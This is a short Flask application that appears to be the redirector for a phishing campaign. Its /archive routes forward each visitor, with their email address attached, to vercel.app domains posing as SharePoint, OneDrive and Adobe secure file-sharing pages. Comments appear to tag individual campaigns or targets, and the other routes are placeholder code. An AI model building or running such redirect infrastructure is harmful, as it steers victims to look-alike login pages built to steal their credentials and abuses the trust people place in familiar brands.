from flask import Flask, request, redirect, render_template

app = Flask(__name__)

# Define redirection rules based on path
def get_redirect_url(path):
    if path == '/archive1':
        return 'https://sharepoint-secure.vercel.app/'
    elif path == '/archive249':
        return 'https://secure-file-share-rho.vercel.app/'
    elif path == '/archive3':
        return 'https://secure-sharing.vercel.app/archive4'
    elif path == '/archive4':
        return 'https://secure-sharing.vercel.app/archive5'
    elif path == '/archive578':
        return 'https://infield-adobe.vercel.app/' # B10 Adobe
    elif path == '/archive6':
        return 'https://secure-sharing.vercel.app/archive7'
    elif path == '/archive7456':
        return 'https://auth-sharepoint.vercel.app/' # NBA-G
    elif path == '/archive8':
        return 'https://onedrive-sharing.vercel.app/'
    elif path == '/archive2567':
        return 'https://auth-sharepoint-asr.vercel.app/'  # B10-OneDriveRR
    elif path == '/archive9':
        return 'https://onedrive-sharing.vercel.app/'
    else:
        return 'https://onedrive-sharing.vercel.app/'

# Route to handle redirection for paths '/archive<int:num>'
@app.route('/archive<int:num>')
def path_handler(num):
    path = f'/archive{num}'
    redirect_url = get_redirect_url(path)

    # Capture the email parameter from the request
    email = request.args.get('email')

    # If an email parameter is present, append it to the redirect URL
    if email:
        redirect_url = f"{redirect_url}?email={email}"

    return redirect(redirect_url)

# Route for the main page
@app.route('/hello')
def hello():
    return 'Hello, world'

# Route for testing
@app.route('/test')
def test():
    return 'Test'

# Route for displaying results
@app.route('/result')
def result():
    scores = {'phy': 50, 'che': 60, 'maths': 70}
    return render_template('result.html', result=scores)

if __name__ == '__main__':
    app.run(debug=True)
